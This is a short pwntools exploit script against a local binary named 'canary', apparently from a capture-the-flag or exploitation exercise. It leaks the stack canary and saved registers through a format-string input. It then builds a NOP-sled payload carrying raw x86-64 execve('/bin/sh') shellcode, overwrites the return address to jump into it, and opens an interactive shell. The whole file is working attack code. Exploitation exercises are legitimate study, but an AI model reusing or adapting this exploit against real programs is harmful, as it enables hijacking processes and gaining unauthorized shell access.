from pwn import *


def get_bash():
    # context.update(arch='x86_64', os='linux')
    # return asm(shellcraft.sh())
    return b'\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05'


p = make_packer(64, endian='little', sign='unsigned')
sh = process(["./canary", '%016lx-' * 23])
res = sh.recvline().decode()
canary_value = int(res.strip().split("-")[-4], 16)
rbp_value = int(res.strip().split("-")[-3], 16)
ra_value = int(res.strip().split("-")[-2], 16)
print(res)
print(p(canary_value))
#   create and write input.txt

bash = get_bash()
amo = b"\x90" * (96 - len(bash)) + bash + b"\x90" * 8
print(hex(canary_value), hex(rbp_value), hex(rbp_value - 140))
amo = amo + p(canary_value) + p(rbp_value) + p(rbp_value - 140)
print(amo)

f = open("input.txt", "wb")
f.write(amo)
f.close()
# contine execution
print("--->", sh.recvline(timeout=1))
sh.send(b"1\n")
sh.interactive()
